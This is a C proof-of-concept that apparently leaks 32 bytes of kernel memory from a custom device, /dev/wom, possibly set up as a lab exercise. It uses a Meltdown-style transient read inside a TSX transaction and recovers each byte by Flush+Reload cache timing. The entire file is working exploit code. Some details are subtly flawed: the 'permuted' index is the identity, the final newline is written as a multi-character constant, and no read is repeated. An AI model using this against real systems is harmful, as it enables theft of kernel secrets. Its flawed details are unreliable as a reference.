#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <inttypes.h>
#include <malloc.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <x86intrin.h>
#include <time.h>
#include <assert.h>

#include "asm.h"

// Probe array for Flush+Reload (256 pages to cover all byte values)
static uint8_t probe_array[256 * 4096];
static volatile uint8_t dummy;  // Used to prevent compiler optimizations

int main() {
    int fd = open("/dev/wom", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    unsigned long secret_addr;
    if (ioctl(fd, 0x1234, &secret_addr) != 0) {  // 0x1234: IOCTL code to get secret address
        perror("ioctl");
        return 1;
    }
    printf("Leaking 32-byte secret at address 0x%lx\n", secret_addr);

    char leaked[33] = {0};
    for (int offset = 0; offset < 32; ++offset) {
        // 1. Flush probe array from cache
        for (int i = 0; i < 256; ++i) {
            _mm_clflush(&probe_array[i * 4096]);
        }

        // 2. Speculatively read the secret byte in a TSX transaction
        if (_xbegin() == _XBEGIN_STARTED) {
            uint8_t value = *(uint8_t *)(secret_addr + offset);   // illegal kernel read (transient)
            dummy = probe_array[value * 4096];  // cache based on secret value
            _xend();
        }
        // Transaction aborts here if illegal access, but cache is affected

        // 3. Reload: Time memory accesses to find which index is cached
        int best_index = -1;
        uint64_t best_time = (uint64_t)-1;
        for (int i = 0; i < 256; ++i) {
            int mix_i = (i + 109883 * 256) & 255;  // Permuted index
            uint8_t *addr = &probe_array[mix_i * 4096];
            // Measure access time for this index
            uint64_t start = rdtscp();
            (void)*addr;               // Access the address
            uint64_t end = rdtscp();
            uint64_t dt = end - start;
            if (dt < best_time) {
                best_time = dt;
                best_index = mix_i;
            }
        }
        leaked[offset] = (char)best_index;
    }

    printf("Leaked secret: ");
    // Print leaked bytes (printable chars or hex values)
    for (int i = 0; i < 32; ++i) {
        unsigned char c = leaked[i];
        if (c >= 32 && c < 127) putchar(c);
        else printf("\\x%02x", c);
    }
    putchar('\\n');

    close(fd);
    return 0;
}